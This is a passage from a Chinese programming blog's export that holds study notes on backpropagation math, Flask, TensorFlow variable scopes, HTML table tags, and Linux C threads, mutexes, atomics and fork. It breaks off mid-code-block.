title="反向传播算法"></a>反向传播算法</h4><p>首先，对于整体神经网络来说，目标函数取输出层所有误差的平方和：</p><p>$$ E_d = \frac{1}{2}\sum_{j \in n_{outputs}}(t_j - y_j)^2 $$</p><p>$ E_d $ 仅代表对于一个样本d的误差，训练规则同上的线性单元的训练使用的<a href="#gradient">梯度下降算法</a>：</p><p>$$ w_{ji} = w_{ji} - \eta\frac{\partial E_d}{\partial w_{ji}} $$</p><p>计算 $ \frac{\partial E_d}{\partial w} $ 需要分输出层、隐藏层两种情况进行计算：</p><p>设一些变量的值</p><p>$$ \begin{aligned}<br>net &amp; = w \cdot x \\<br>y &amp; = sigmoid(net) \\<br>\delta_j &amp; = -\frac{\partial E_d}{\partial net_j} \\<br>j &amp; ，神经元输出第j维 \\<br>i &amp; ，神经元输入第i维 \\<br>k &amp; ，神经网络隐藏层第k层 \\<br>o &amp; ，神经网络的输出层<br>\end{aligned} $$</p><h5 id="输出层"><a href="#输出层" class="headerlink" title="输出层"></a>输出层</h5><p>由链式求导法则，</p><p>$$ \frac{\partial E_d}{\partial w_{ji}} = \frac{\partial E_d}{\partial y_j}\frac{\partial y_j}{\partial net_j}\frac{\partial net_j}{\partial w_{ji}} $$</p><p>其中，</p><p>$$ \begin{aligned}<br>\frac{\partial E_d}{\partial y_j} &amp; = \frac{\partial \frac{1}{2}\sum_{j}(t_j - y_j)^2}{\partial y_j} = -(t_j - y_j) \\<br>\frac{\partial y_j}{\partial net_j} &amp; = \frac{\partial sigmoid(net_j)}{\partial net_j} = y_j(1 - y_j) \\<br>\frac{\partial net_j}{\partial w_{ji}} &amp; = \frac{\partial \sum_{i} w_{ji}x_{ji}}{\partial w_{ji}} = x_{ji} \\<br>\frac{\partial E_d}{\partial net_j} &amp; = -(t_j - y_j)y_j(1 - y_j) = -\delta_j<br>\end{aligned} $$</p><p>代入得</p><p>$$ \frac{\partial E_d}{\partial w_{ji}} = \frac{\partial E_d}{\partial y_j}\frac{\partial y_j}{\partial net_j}\frac{\partial net_j}{\partial w_{ji}} = -(t_j - y_j)y_j(1 - y_j)x_{ji} = -\delta_j x_{ji} $$</p><p>所以输出层的 $ w_{ji} $ 训练规则为：</p><p>$$ w_{ji} \leftarrow w_{ji} - \eta\frac{\partial E_d}{\partial w_{ji}} = w_{ji} + \eta \delta_j x_{ji} $$</p><h5 id="隐藏层"><a href="#隐藏层" class="headerlink" title="隐藏层"></a>隐藏层</h5><p>用递推公式，设隐藏层有 $ n $ 层</p><h6 id="第-n-层隐藏层"><a href="#第-n-层隐藏层" class="headerlink" title="第 $ n $ 层隐藏层"></a>第 $ n $ 层隐藏层</h6><p>$$ \frac{\partial E_d}{\partial w_{j_ni}} = \frac{\partial E_d}{\partial net_{j_n}}\frac{\partial net_{j_n}}{\partial w_{j_ni}} $$</p><p>$ E_d $ 不是 $ net_{j_n} $ 直接函数，但输出层的 $ net_{j_o} $ 是 $ net_{j_n} $ 的函数，且有</p><p>$$ \frac{\partial E_d}{\partial net_{j_n}} = \sum_{j_o}\frac{\partial E_d}{\partial net_{j_o}}\frac{\partial net_{j_o}}{\partial net_{j_n}} = \sum_{j_o}-\delta_{j_o}\frac{\partial net_{j_o}}{\partial net_{j_n}} $$</p><p>设 $ y_{j_n} $ 为隐藏层第 $ j_n $ 个神经元的输出，同时也是输出层所有神经元的第 $ j_n $ 输入 $ x_{j_n} $，</p><p>$$ \begin{aligned}<br>\frac{\partial net_{j_o}}{\partial net_{j_n}} &amp; = \frac{\partial net_{j_o}}{\partial y_{j_n}}\frac{\partial y_{j_n}}{\partial net_{j_n}} \\<br>\frac{\partial net_{j_o}}{\partial y_{j_n}} &amp; = \frac{\partial \sum_{i} w_{j_oi}x_{j_oi}}{\partial y_{j_n}} = w_{j_oj_n} \\<br>\frac{\partial y_{j_n}}{\partial net_{j_n}} &amp; = \frac{\partial sigmoid(net_{j_n})}{\partial net_{j_n}} = y_{j_n}(1 - y_{j_n})<br>\end{aligned} $$</p><p>代入得</p><p>$$ \begin{aligned}<br>\frac{\partial E_d}{\partial net_{j_n}} &amp; = \sum_{j_o}\frac{\partial E_d}{\partial net_{j_o}}\frac{\partial net_{j_o}}{\partial net_{j_n}} \\<br>&amp; = \sum_{j_o} -\delta_{j_o} w_{j_oj_n} y_{j_n} (1 - y_{j_n}) \\<br>&amp; = y_{j_n} (1 - y_{j_n}) \sum_{j_o} -\delta_{j_o} w_{j_oj_n} \\<br>&amp; = -\delta_{j_n}<br>\end{aligned} $$</p><h6 id="递推到第-n-k-层"><a href="#递推到第-n-k-层" class="headerlink" title="递推到第 $ n - k $ 层"></a>递推到第 $ n - k $ 层</h6><p>$$ \frac{\partial E_d}{\partial w_{j_{n-k}i}} = \frac{\partial E_d}{\partial net_{j_{n-k}}}\frac{\partial net_{j_{n-k}}}{\partial w_{j_{n-k}i}} = -\delta_{j_{n - k}}x_{j_{n - k}i} $$</p><p>其中</p><p>$$ \delta_{j_{n - k}} = y_{j_{n - k}} (1 - y_{j_{n - k}}) \sum_{j_{n - k + 1}} \delta_{j_{n - k + 1}} w_{j_{n - k + 1}j_{n - k}} $$</p>]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Study</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask学习笔记</title>
    <url>/2018/12/19/2018-12-19-flaskNotes/</url>
    <content><![CDATA[<h1 id="Flask是什么"><a href="#Flask是什么" class="headerlink" title="Flask是什么"></a>Flask是什么</h1><ul><li>轻量级web应用框架</li><li>python语言编写</li></ul>]]></content>
      <categories>
        <category>Program</category>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title>tensorflow学习笔记</title>
    <url>/2018/12/19/2018-12-19-tensorflowNotes/</url>
    <content><![CDATA[<h1 id="TensorFlow是什么"><a href="#TensorFlow是什么" class="headerlink" title="TensorFlow是什么"></a>TensorFlow是什么</h1><ul><li>TensorFlow是谷歌基于DistBelief进行研发的第二代人工智能学习系统</li><li>用于语音识别或者图像识别多项机器学习和深度学习领域</li><li>将复杂的数据结构传输到人工智能神经网中进行分析和处理过程的系统、</li><li>支持CNN、RNN和LSTM算法，都是Image、Speech和NLP最流行的深度神经网络模型</li></ul><h1 id="tensorflow语法"><a href="#tensorflow语法" class="headerlink" title="tensorflow语法"></a>tensorflow语法</h1><p>语法细节可以看<a href="https://www.w3cschool.cn/tensorflow_python/" target="_blank" rel="noopener">W3Cschool的tensorflow官方文档</a>，下面记录的是自己觉得需要记录的东西</p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>在TensorFlow的世界里，变量的定义和初始化是分开的，所有关于图变量的赋值和计算都要通过tf.Session的run来进行。想要将所有图变量进行集体初始化时应该使用tf.global_variables_initializer。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tf.Variable(initializer, name) <span class="comment">#参数initializer是初始化参数，name是可自定义的变量名称</span></span><br></pre></td></tr></table></figure><p>实例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"></span><br><span class="line">v1 = tf.Variable(tf.random_normal(shape=[<span class="number">4</span>, <span class="number">3</span>], mean=<span class="number">0</span>, stddev=<span class="number">1</span>), name=<span class="string">'v1'</span>)</span><br><span class="line">v2 = tf.Variable(tf.constant(<span class="number">2</span>), name=<span class="string">'v2'</span>)</span><br><span class="line">v3 = tf.Variable(tf.ones([<span class="number">4</span>, <span class="number">3</span>]), name=<span class="string">'v3'</span>)</span><br><span class="line"><span class="keyword">with</span> tf.Session() <span class="keyword">as</span> sess:</span><br><span class="line">    sess.run(tf.global_variables_initializer())</span><br><span class="line">    print(sess.run(v1))</span><br><span class="line">    print(sess.run(v2))</span><br><span class="line">    print(sess.run(v3))</span><br></pre></td></tr></table></figure><h3 id="变量命名空间-variable-scope"><a href="#变量命名空间-variable-scope" class="headerlink" title="变量命名空间 variable_scope"></a>变量命名空间 variable_scope</h3><p>variable_scope定义了变量的命名空间</p><h4 id="示例1-如何创建一个新变量："><a href="#示例1-如何创建一个新变量：" class="headerlink" title="示例1-如何创建一个新变量："></a>示例1-如何创建一个新变量：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> tf.variable_scope(<span class="string">"foo"</span>):</span><br><span class="line">    <span class="keyword">with</span> tf.variable_scope(<span class="string">"bar"</span>):</span><br><span class="line">        v = tf.get_variable(<span class="string">"v"</span>, [<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>其中<code>v.name == &quot;foo/bar/v:0&quot;</code></p><h4 id="示例2-共享变量AUTO-REUSE："><a href="#示例2-共享变量AUTO-REUSE：" class="headerlink" title="示例2-共享变量AUTO_REUSE："></a>示例2-共享变量AUTO_REUSE：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> tf.variable_scope(<span class="string">"foo"</span>, reuse=tf.AUTO_REUSE):</span><br><span class="line">        v = tf.get_variable(<span class="string">"v"</span>, [<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v1 = foo()  <span class="comment"># Creates v.</span></span><br><span class="line">v2 = foo()  <span class="comment"># Gets the same, existing v.</span></span><br><span class="line">print(v1.name) <span class="comment"># foo/v:0</span></span><br><span class="line">print(v2.name) <span class="comment"># foo/v:0</span></span><br></pre></td></tr></table></figure><p>其中<code>v1 == v2</code></p><h4 id="示例3-使用reuse-True共享变量："><a href="#示例3-使用reuse-True共享变量：" class="headerlink" title="示例3-使用reuse=True共享变量："></a>示例3-使用reuse=True共享变量：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> tf.variable_scope(<span class="string">"foo"</span>):</span><br><span class="line">    v = tf.get_variable(<span class="string">"v"</span>, [<span class="number">1</span>])</span><br><span class="line"><span class="keyword">with</span> tf.variable_scope(<span class="string">"foo"</span>, reuse=<span class="literal">True</span>):</span><br><span class="line">    v1 = tf.get_variable(<span class="string">"v"</span>, [<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>其中<code>v == v1</code></p><h4 id="示例4-通过捕获范围并设置重用来共享变量："><a href="#示例4-通过捕获范围并设置重用来共享变量：" class="headerlink" title="示例4-通过捕获范围并设置重用来共享变量："></a>示例4-通过捕获范围并设置重用来共享变量：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> tf.variable_scope(<span class="string">"foo"</span>) <span class="keyword">as</span> scope:</span><br><span class="line">    v = tf.get_variable(<span class="string">"v"</span>, [<span class="number">1</span>])</span><br><span class="line">    scope.reuse_variables()</span><br><span class="line">    v1 = tf.get_variable(<span class="string">"v"</span>, [<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>其中<code>v == v1</code></p><h4 id="为了防止意外共享变量，我们在获取非重用范围中的现有变量时引发异常。"><a href="#为了防止意外共享变量，我们在获取非重用范围中的现有变量时引发异常。" class="headerlink" title="为了防止意外共享变量，我们在获取非重用范围中的现有变量时引发异常。"></a>为了防止意外共享变量，我们在获取非重用范围中的现有变量时引发异常。</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> tf.variable_scope(<span class="string">"foo"</span>):</span><br><span class="line">    v = tf.get_variable(<span class="string">"v"</span>, [<span class="number">1</span>])</span><br><span class="line">    v1 = tf.get_variable(<span class="string">"v"</span>, [<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>将会触发<code>ValueError(&quot;... v already exists ...&quot;)</code>异常</p><h4 id="同样，我们在尝试获取重用模式中不存在的变量时引发异常。"><a href="#同样，我们在尝试获取重用模式中不存在的变量时引发异常。" class="headerlink" title="同样，我们在尝试获取重用模式中不存在的变量时引发异常。"></a>同样，我们在尝试获取重用模式中不存在的变量时引发异常。</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> tf.variable_scope(<span class="string">"foo"</span>, reuse=<span class="literal">True</span>):</span><br><span class="line">    v = tf.get_variable(<span class="string">"v"</span>, [<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>将会触发<code>ValueError(&quot;... v does not exists ...&quot;)</code>异常</p><h2 id="矩阵"><a href="#矩阵" class="headerlink" title="矩阵"></a>矩阵</h2><h3 id="zeros矩阵"><a href="#zeros矩阵" class="headerlink" title="zeros矩阵"></a>zeros矩阵</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"></span><br><span class="line">v1 = tf.Variable(zeros([<span class="number">2</span>, <span class="number">3</span>])， name=<span class="string">'v1'</span>) <span class="comment">#两行三列矩阵</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> tf.Session() <span class="keyword">as</span> sess:</span><br><span class="line">    sess.run(tf.global_variables_initializer())</span><br><span class="line">    print(sess.run(v1))</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[[0. 0. 0.]</span><br><span class="line"> [0. 0. 0.]]</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Program</category>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title>HTML标签笔记</title>
    <url>/2018/12/05/2018-12-05-htmlNotes/</url>
    <content><![CDATA[<h1 id="上下标"><a href="#上下标" class="headerlink" title="上下标"></a>上下标</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">y = x<span class="tag">&lt;<span class="name">sup</span>&gt;</span>2<span class="tag">&lt;/<span class="name">sup</span>&gt;</span></span><br><span class="line">H<span class="tag">&lt;<span class="name">sub</span>&gt;</span>2<span class="tag">&lt;/<span class="name">sub</span>&gt;</span>O</span><br></pre></td></tr></table></figure><p>效果</p><p>y = x<sup>2</sup><br>H<sub>2</sub>O</p><h1 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h1><h2 id="表格和表头"><a href="#表格和表头" class="headerlink" title="表格和表头"></a>表格和表头</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Heading<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Another Heading<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>row 1, cell 1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>row 1, cell 2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>row 2, cell 1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>row 2, cell 2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果</p><table><tr><th>Heading</th><th>Another Heading</th></tr><tr><td>row 1, cell 1</td><td>row 1, cell 2</td></tr><tr><td>row 2, cell 1</td><td>row 2, cell 2</td></tr></table><h2 id="合并单元格"><a href="#合并单元格" class="headerlink" title="合并单元格"></a>合并单元格</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>横跨两列的单元格：<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span> <span class="attr">colspan</span>=<span class="string">"2"</span>&gt;</span>电话<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>Bill Gates<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>555 77 854<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>555 77 855<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>横跨两行的单元格：<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>Bill Gates<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span> <span class="attr">rowspan</span>=<span class="string">"2"</span>&gt;</span>电话<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>555 77 854<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>555 77 855<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果</p><h4>横跨两列的单元格：</h4><table><tr><th>姓名</th><th colspan="2">电话</th></tr><tr><td>Bill Gates</td><td>555 77 854</td><td>555 77 855</td></tr></table><h4>横跨两行的单元格：</h4><table><tr><th>姓名</th><td>Bill Gates</td></tr><tr><th rowspan="2">电话</th><td>555 77 854</td></tr><tr><td>555 77 855</td></tr></table>]]></content>
      <categories>
        <category>Program</category>
        <category>Web</category>
      </categories>
  </entry>
  <entry>
    <title>操作系统编程笔记（C语言）</title>
    <url>/2018/12/04/2018-12-04-OSProgram/</url>
    <content><![CDATA[<p>操作系统课程设计总结出来的笔记，源码见: <a href="https://github.com/Githubwyb/operation_system_homework" target="_blank" rel="noopener">https://github.com/Githubwyb/operation_system_homework</a></p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul><li>操作系统: Linux</li><li>编译器: make</li></ul><h1 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h1><h2 id="创建线程"><a href="#创建线程" class="headerlink" title="创建线程"></a>创建线程</h2><ul><li>创建函数</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 线程创建函数</span></span><br><span class="line"><span class="comment"> * @param tidp 线程标识符</span></span><br><span class="line"><span class="comment"> * @param attr 线程属性指针</span></span><br><span class="line"><span class="comment"> * @param start_rtn 线程执行函数(void *fun(void *))</span></span><br><span class="line"><span class="comment"> * @param arg 线程执行函数的参数</span></span><br><span class="line"><span class="comment"> * @return 0，创建成功；其他，错误码</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_create</span><span class="params">(<span class="keyword">pthread_t</span> *tidp,</span></span></span><br><span class="line"><span class="function"><span class="params">                    <span class="keyword">const</span> <span class="keyword">pthread_attr_t</span> *attr,</span></span></span><br><span class="line"><span class="function"><span class="params">                    (<span class="keyword">void</span>*)(*start_rtn)(<span class="keyword">void</span>*),</span></span></span><br><span class="line"><span class="function"><span class="params">                    <span class="keyword">void</span> *arg)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>等待线程结束</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 等待线程结束函数</span></span><br><span class="line"><span class="comment"> * @param thread 线程标识符</span></span><br><span class="line"><span class="comment"> * @param retval 获取线程结束返回值</span></span><br><span class="line"><span class="comment"> * @return 0，创建成功；其他，错误码</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_join</span><span class="params">(<span class="keyword">pthread_t</span> thread,</span></span></span><br><span class="line"><span class="function"><span class="params">                    <span class="keyword">void</span> **retval)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>示例</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//线程执行函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">threadHandler</span><span class="params">(<span class="keyword">void</span> *param)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> threadID;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建线程</span></span><br><span class="line">    <span class="keyword">int</span> code = pthread_create(&amp;threadID, <span class="literal">NULL</span>, threadHandler, <span class="literal">NULL</span>);</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">//等待线程结束</span></span><br><span class="line">    code = pthread_join(threadID, <span class="literal">NULL</span>);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="线程锁"><a href="#线程锁" class="headerlink" title="线程锁"></a>线程锁</h2><ul><li>初始化和销毁</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 初始化锁</span></span><br><span class="line"><span class="comment"> * @param mutex 线程互斥锁指针</span></span><br><span class="line"><span class="comment"> * @param attr 互斥锁属性，可以传NULL使用默认值</span></span><br><span class="line"><span class="comment"> * @return 0，成功；其他，错误码</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_mutex_init</span><span class="params">(<span class="keyword">pthread_mutex_t</span> *<span class="keyword">restrict</span> mutex, <span class="keyword">const</span> <span class="keyword">pthread_mutexattr_t</span> *<span class="keyword">restrict</span> attr)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 销毁互斥锁</span></span><br><span class="line"><span class="comment"> * @param mutex 线程互斥锁指针</span></span><br><span class="line"><span class="comment"> * @return 0，成功；其他，错误码</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_mutex_destroy</span><span class="params">(<span class="keyword">pthread_mutex_t</span> *mutex)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>上锁函数，被占用将阻塞线程</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 申请锁</span></span><br><span class="line"><span class="comment"> * @param mutex 线程互斥锁</span></span><br><span class="line"><span class="comment"> * @return 0，创建成功；其他，错误码</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_mutex_lock</span><span class="params">(<span class="keyword">pthread_mutex_t</span> *mutex)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>解锁函数</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 解锁</span></span><br><span class="line"><span class="comment"> * @param mutex 线程互斥锁</span></span><br><span class="line"><span class="comment"> * @return 0，创建成功；其他，错误码</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_mutex_unlock</span><span class="params">(<span class="keyword">pthread_mutex_t</span> *mutex)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>示例</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pthread_mutex_t</span> mutex;</span><br><span class="line"><span class="comment">//线程执行函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">threadHandler</span><span class="params">(<span class="keyword">void</span> *param)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">//申请锁</span></span><br><span class="line">        pthread_mutex_lock(&amp;mutex);</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">//释放锁</span></span><br><span class="line">        pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="原子操作（GCC）"><a href="#原子操作（GCC）" class="headerlink" title="原子操作（GCC）"></a>原子操作（GCC）</h2><p>同一个进程中，原子操作是不可被线程间抢占的。一个线程中的原子操作可以实现同步，加快线程间的协调作用，进行无锁化编程。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">type __sync_fetch_and_add (type *ptr, type value);  <span class="comment">//获取值后加上value</span></span><br><span class="line">type __sync_fetch_and_sub (type *ptr, type value);</span><br><span class="line">type __sync_fetch_and_or (type *ptr, type value);</span><br><span class="line">type __sync_fetch_and_and (type *ptr, type value);</span><br><span class="line">type __sync_fetch_and_xor (type *ptr, type value);</span><br><span class="line">type __sync_fetch_and_nand (type *ptr, type value);</span><br><span class="line">type __sync_add_and_fetch (type *ptr, type value);</span><br><span class="line">type __sync_sub_and_fetch (type *ptr, type value);</span><br><span class="line">type __sync_or_and_fetch (type *ptr, type value);</span><br><span class="line">type __sync_and_and_fetch (type *ptr, type value);</span><br><span class="line">type __sync_xor_and_fetch (type *ptr, type value);</span><br><span class="line">type __sync_nand_and_fetch (type *ptr, type value);</span><br></pre></td></tr></table></figure><h2 id="线程相关知识"><a href="#线程相关知识" class="headerlink" title="线程相关知识"></a>线程相关知识</h2><ul><li>线程内部创建变量是不共享的</li><li>全局变量线程内部共享</li></ul><h1 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h1><h2 id="创建进程"><a href="#创建进程" class="headerlink" title="创建进程"></a>创建进程</h2><ul><li>创建函数</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 创建一个进程</span></span><br><span class="line"><span class="comment"> * @return pid_t实质是int，包含在&lt;sys/types.h&gt;中，子进程返回0；父进程返回子进程号；-1为错误</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">pid_t</span> fork(<span class="keyword">void</span>);</span><br></pre></td></tr></table></figure><ul><li>等待线程结束</li></ul><p>当有子进程结束或僵尸进程时，立刻返回第一个结束的子进程ID。如果有子进程在运行，阻塞父进程。如果没有子进程在运行，返回-1。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span 